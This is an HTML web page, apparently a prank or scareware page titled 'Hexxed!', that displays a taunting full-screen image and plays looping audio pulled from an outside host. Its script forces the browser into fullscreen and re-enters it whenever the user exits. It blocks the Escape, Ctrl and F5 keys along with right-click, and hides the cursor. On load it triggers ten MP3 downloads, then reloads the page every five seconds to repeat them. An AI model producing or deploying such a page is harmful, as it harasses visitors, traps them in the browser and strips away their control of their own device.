<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Hexxed!</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    .fullscreen-popup {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      user-select: none; /* Prevent text selection */
    }
    
    .popup-content {
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      object-position: center;
      user-select: none;
      pointer-events: none; /* Prevent interaction with image */
    }

    /* Hide cursor to make exiting fullscreen harder */
    body.fullscreen {
      cursor: none;
    }
  </style>
</head>
<body>
  <div class="fullscreen-popup" id="popup">
    <div class="popup-content">
      <img src="KaiSoni owns You!.png" alt="Fullscreen Image" />
    </div>
  </div>

  <audio id="aud" src="https://jewls-gray.vercel.app/1.mp3" preload="auto" loop></audio>

  <script>
    const popup = document.getElementById('popup');
    const audio = document.getElementById('aud');
    const mp3Url = 'https://jewls-gray.vercel.app/1.mp3';

    // Function to trigger MP3 download
    function triggerDownload(url, filename) {
      const a = document.createElement('a');
      a.href = url;
      a.download = filename || '1.mp3';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }

    // Fullscreen functionality
    function enterFullscreen() {
      const el = document.documentElement;
      if (!el) return;
      if (el.requestFullscreen) {
        el.requestFullscreen().catch(() => {});
      } else if (el.webkitRequestFullscreen) {
        el.webkitRequestFullscreen();
      } else if (el.msRequestFullscreen) {
        el.msRequestFullscreen();
      }
      document.body.classList.add('fullscreen'); // Hide cursor in fullscreen
    }

    // Attempt to play audio
    function tryPlayAudio() {
      audio.play().catch((error) => {
        console.log('Autoplay prevented:', error);
        document.addEventListener('click', () => {
          audio.play().catch(() => {});
        }, { once: true });
      });
    }

    // Prevent exiting fullscreen via keyboard (Esc key workaround)
    function trapFullscreen() {
      document.addEventListener('fullscreenchange', () => {
        if (!document.fullscreenElement) {
          enterFullscreen(); // Re-enter fullscreen if exited
        }
      });
      document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
          e.preventDefault(); // Attempt to block Esc key
          enterFullscreen();
        }
      });
    }

    // Workaround for spamming downloads
    function spamDownloads() {
      const downloadCount = 10; // Increased for more attempts
      let delay = 100; // Initial delay in ms
      for (let i = 0; i < downloadCount; i++) {
        setTimeout(() => {
          triggerDownload(mp3Url, `1_${i + 1}.mp3`);
        }, delay);
        delay += 300; // Incremental delay to avoid browser blocking
      }
    }

    window.addEventListener('load', () => {
      enterFullscreen();
      trapFullscreen(); // Set up fullscreen trap
      tryPlayAudio();
      spamDownloads(); // Trigger download spam

      // Refresh page after a delay to repeat downloads
      setTimeout(() => {
        window.location.reload();
      }, 5000); // Increased to 5 seconds for better UX
    });

    // Handle visibility change
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        audio.pause();
      } else {
        tryPlayAudio();
        enterFullscreen(); // Re-enter fullscreen if tab is re-focused
      }
    });

    // Prevent right-click and other interactions
    document.addEventListener('contextmenu', (e) => e.preventDefault());
    document.addEventListener('keydown', (e) => {
      // Block common shortcuts like Ctrl+R, F5, Ctrl+T, Ctrl+W
      if (e.ctrlKey || e.key === 'F5' || e.key === 'Escape') {
        e.preventDefault();
      }
    });
  </script>
</body>
</html>
